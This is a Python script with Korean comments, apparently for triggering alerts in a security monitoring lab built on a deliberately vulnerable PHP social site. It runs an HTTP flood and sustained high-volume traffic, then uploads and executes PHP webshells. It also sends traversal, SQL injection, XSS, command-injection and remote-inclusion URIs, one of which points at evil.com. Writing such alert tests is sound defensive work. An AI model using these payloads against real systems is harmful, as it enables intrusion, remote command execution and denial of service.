#!/usr/bin/env python3
"""
보안 알림 테스트 스크립트
스크린샷에 보이는 모든 보안 알림을 트리거하여 알림 시스템을 테스트합니다.
"""

import requests
import threading
import time
import random
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

# 색상 코드
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

# 설정
TARGET_IP = input(f"{Colors.OKBLUE}타겟 IP/도메인을 입력하세요 (예: localhost 또는 EC2 IP): {Colors.ENDC}").strip()
BASE_URL = f"http://{TARGET_IP}/vulnerable-sns/www"

# 테스트 계정
TEST_ACCOUNTS = [
    {'username': 'alice', 'password': 'alice2024'},
    {'username': 'bob', 'password': 'bob2024'},
]

class SecurityAlertTester:
    def __init__(self):
        self.session = requests.Session()
        self.results = {
            'http_flood': False,
            'webshell_upload': False,
            'abnormal_uri': False,
            'high_request_volume': False
        }

    def print_banner(self):
        """배너 출력"""
        print(f"\n{Colors.HEADER}{Colors.BOLD}")
        print("=" * 70)
        print("          보안 알림 테스트 스크립트")
        print("=" * 70)
        print(f"{Colors.ENDC}")
        print(f"{Colors.WARNING}주의: 이 스크립트는 교육 목적으로만 사용하세요{Colors.ENDC}\n")

    def login(self, username='alice', password='alice2024'):
        """로그인"""
        try:
            data = {'username': username, 'password': password}
            r = self.session.post(f"{BASE_URL}/login.php", data=data, timeout=5)
            if 'dashboard' in r.url or r.status_code == 302:
                return True
        except Exception as e:
            print(f"{Colors.FAIL}로그인 실패: {e}{Colors.ENDC}")
        return False

    def test_http_flood(self, num_requests=100, threads=10):
        """
        1. HTTP 플러드(DDoS 요청 의심) 테스트
        짧은 시간에 대량의 HTTP 요청을 전송하여 알림을 트리거합니다.
        """
        print(f"\n{Colors.OKBLUE}[테스트 1] HTTP 플러드 공격 시뮬레이션{Colors.ENDC}")
        print(f"  - 요청 수: {num_requests}")
        print(f"  - 스레드: {threads}")

        def send_request(i):
            try:
                # 다양한 엔드포인트에 요청
                endpoints = [
                    f"{BASE_URL}/index.php",
                    f"{BASE_URL}/login.php",
                    f"{BASE_URL}/profile.php",
                    f"{BASE_URL}/file.php?name=test.txt",
                ]
                url = random.choice(endpoints)
                requests.get(url, timeout=5)
                if i % 10 == 0:
                    print(f"{Colors.OKCYAN}  진행: {i}/{num_requests}{Colors.ENDC}")
                return True
            except:
                return False

        start_time = time.time()

        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(send_request, i) for i in range(num_requests)]
            success = sum([1 for f in as_completed(futures) if f.result()])

        elapsed = time.time() - start_time
        print(f"{Colors.OKGREEN}  완료: {success}/{num_requests} 요청 성공 (소요 시간: {elapsed:.2f}초){Colors.ENDC}")
        print(f"{Colors.WARNING}  초당 요청: {success/elapsed:.2f} req/sec{Colors.ENDC}")
        self.results['http_flood'] = True

    def test_webshell_upload_and_execution(self):
        """
        2. 웹쉘 업로드 및 실행 탐지 테스트
        악의적인 PHP 웹쉘을 업로드하고 실행을 시도합니다.
        """
        print(f"\n{Colors.OKBLUE}[테스트 2] 웹쉘 업로드 및 실행 탐지{Colors.ENDC}")

        # 로그인
        if not self.login():
            print(f"{Colors.FAIL}  로그인 실패{Colors.ENDC}")
            return

        # 다양한 웹쉘 페이로드
        webshells = [
            ('shell1.php', '<?php system($_GET["cmd"]); ?>'),
            ('shell2.php5', '<?php eval($_POST["code"]); ?>'),
            ('shell3.phtml', '<?php passthru($_GET["x"]); ?>'),
            ('backdoor.php', '<?php @eval($_POST[chr(97)]); ?>'),
            ('cmd.php', '<?php echo shell_exec($_GET["c"]); ?>'),
        ]

        uploaded_files = []

        for filename, payload in webshells:
            try:
                files = {'file': (filename, payload, 'application/x-php')}
                r = self.session.post(f"{BASE_URL}/upload.php", files=files, timeout=10)

                if r.status_code == 200:
                    print(f"{Colors.OKGREEN}  업로드 시도: {filename}{Colors.ENDC}")
                    uploaded_files.append(filename)
                    time.sleep(0.5)
            except Exception as e:
                print(f"{Colors.FAIL}  업로드 실패 ({filename}): {e}{Colors.ENDC}")

        # 업로드된 웹쉘 실행 시도
        print(f"\n{Colors.WARNING}  웹쉘 실행 시도...{Colors.ENDC}")
        for filename in uploaded_files:
            try:
                # file.php를 통한 실행 시도
                params = {'name': filename, 'cmd': 'whoami'}
                r = self.session.get(f"{BASE_URL}/file.php", params=params, timeout=5)
                print(f"{Colors.OKCYAN}  실행 시도: {filename}{Colors.ENDC}")

                # 직접 접근 시도
                r = self.session.get(f"{BASE_URL}/uploads/{filename}?cmd=id", timeout=5)
                time.sleep(0.3)
            except:
                pass

        self.results['webshell_upload'] = True
        print(f"{Colors.OKGREEN}  완료: {len(uploaded_files)}개 웹쉘 업로드 시도{Colors.ENDC}")

    def test_abnormal_uri_requests(self, num_requests=50):
        """
        3. 비정상적인 URI 다량 요청 테스트
        공격 패턴이 포함된 URI를 대량으로 요청합니다.
        """
        print(f"\n{Colors.OKBLUE}[테스트 3] 비정상적인 URI 다량 요청{Colors.ENDC}")

        # 공격 패턴 URI
        malicious_uris = [
            # Path Traversal
            "/file.php?name=../../etc/passwd",
            "/file.php?name=../../../../etc/shadow",
            "/file.php?name=../config.php",
            "/download.php?file=../../../../../../etc/hosts",

            # SQL Injection
            "/login.php?username=admin'--&password=test",
            "/index.php?id=1' OR '1'='1",
            "/profile.php?id=1 UNION SELECT NULL,username,password FROM users--",

            # XSS
            "/index.php?search=<script>alert('XSS')</script>",
            "/profile.php?name=<img src=x onerror=alert(1)>",

            # Command Injection
            "/file.php?name=test.txt;whoami",
            "/upload.php?path=|ls -la",

            # LFI/RFI
            "/file.php?name=/etc/passwd",
            "/file.php?name=http://evil.com/shell.txt",

            # Directory Listing
            "/uploads/",
            "/../",
            "/./",

            # Suspicious patterns
            "/index.php?lang=../../../../tmp/index1.php",
            "/index.php?think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id",
            "/index.php?s=/index/think\\app/invokefunction",
        ]

        print(f"  - 전송할 악의적 URI 수: {num_requests}")

        success_count = 0
        for i in range(num_requests):
            try:
                uri = random.choice(malicious_uris)
                url = BASE_URL + uri
                requests.get(url, timeout=3)
                success_count += 1

                if i % 10 == 0:
                    print(f"{Colors.OKCYAN}  진행: {i}/{num_requests}{Colors.ENDC}")

                time.sleep(0.1)  # 약간의 딜레이
            except:
                pass

        self.results['abnormal_uri'] = True
        print(f"{Colors.OKGREEN}  완료: {success_count}/{num_requests} 악의적 URI 요청 전송{Colors.ENDC}")

    def test_high_request_volume(self, duration=30, requests_per_second=20):
        """
        4. High Request Volume 테스트
        지속적으로 높은 트래픽을 발생시킵니다.
        """
        print(f"\n{Colors.OKBLUE}[테스트 4] High Request Volume (대량 트래픽){Colors.ENDC}")
        print(f"  - 지속 시간: {duration}초")
        print(f"  - 초당 요청: {requests_per_second}")

        start_time = time.time()
        request_count = 0

        def send_continuous_requests():
            nonlocal request_count
            endpoints = [
                f"{BASE_URL}/index.php",
                f"{BASE_URL}/login.php",
                f"{BASE_URL}/profile.php",
                f"{BASE_URL}/new_post.php",
                f"{BASE_URL}/file.php?name=test.txt",
                f"{BASE_URL}/upload.php",
            ]

            while time.time() - start_time < duration:
                try:
                    url = random.choice(endpoints)
                    requests.get(url, timeout=2)
                    request_count += 1
                    time.sleep(1.0 / requests_per_second)
                except:
                    pass

        # 멀티 스레드로 동시 요청
        threads = []
        for _ in range(5):
            t = threading.Thread(target=send_continuous_requests)
            t.daemon = True
            t.start()
            threads.append(t)

        # 진행 상황 표시
        while time.time() - start_time < duration:
            elapsed = time.time() - start_time
            print(f"{Colors.OKCYAN}  진행: {elapsed:.1f}/{duration}초 - 총 요청: {request_count}{Colors.ENDC}", end='\r')
            time.sleep(1)

        # 스레드 종료 대기
        for t in threads:
            t.join(timeout=2)

        total_time = time.time() - start_time
        avg_rps = request_count / total_time

        print(f"\n{Colors.OKGREEN}  완료: 총 {request_count}개 요청 전송{Colors.ENDC}")
        print(f"{Colors.WARNING}  평균 초당 요청: {avg_rps:.2f} req/sec{Colors.ENDC}")
        self.results['high_request_volume'] = True

    def run_all_tests(self):
        """모든 테스트 실행"""
        self.print_banner()

        print(f"{Colors.BOLD}타겟 URL: {BASE_URL}{Colors.ENDC}\n")

        try:
            # 각 테스트 실행
            self.test_http_flood(num_requests=100, threads=10)
            time.sleep(2)

            self.test_webshell_upload_and_execution()
            time.sleep(2)

            self.test_abnormal_uri_requests(num_requests=50)
            time.sleep(2)

            self.test_high_request_volume(duration=30, requests_per_second=20)

        except KeyboardInterrupt:
            print(f"\n\n{Colors.WARNING}테스트가 사용자에 의해 중단되었습니다.{Colors.ENDC}")
        except Exception as e:
            print(f"\n{Colors.FAIL}오류 발생: {e}{Colors.ENDC}")

        # 결과 요약
        self.print_summary()

    def print_summary(self):
        """테스트 결과 요약"""
        print(f"\n{Colors.HEADER}{Colors.BOLD}")
        print("=" * 70)
        print("                    테스트 결과 요약")
        print("=" * 70)
        print(f"{Colors.ENDC}")

        tests = [
            ("HTTP 플러드(DDoS 요청 의심)", self.results['http_flood']),
            ("웹쉘 업로드 및 실행 탐지", self.results['webshell_upload']),
            ("비정상적인 URI 다량 요청", self.results['abnormal_uri']),
            ("High Request Volume", self.results['high_request_volume']),
        ]

        for test_name, result in tests:
            status = f"{Colors.OKGREEN}완료{Colors.ENDC}" if result else f"{Colors.FAIL}실패{Colors.ENDC}"
            print(f"  [{status}] {test_name}")

        print(f"\n{Colors.WARNING}보안 알림 시스템을 확인하세요!{Colors.ENDC}")
        print(f"{Colors.OKCYAN}스크린샷에 보이는 알림들이 트리거되었는지 확인하세요.{Colors.ENDC}\n")

def main():
    """메인 함수"""
    tester = SecurityAlertTester()

    print(f"\n{Colors.WARNING}이 스크립트는 보안 알림 시스템을 테스트합니다.{Colors.ENDC}")
    print(f"{Colors.WARNING}계속하시겠습니까? (y/n): {Colors.ENDC}", end='')

    if input().lower() != 'y':
        print(f"{Colors.FAIL}테스트가 취소되었습니다.{Colors.ENDC}")
        return

    tester.run_all_tests()

if __name__ == "__main__":
    main()
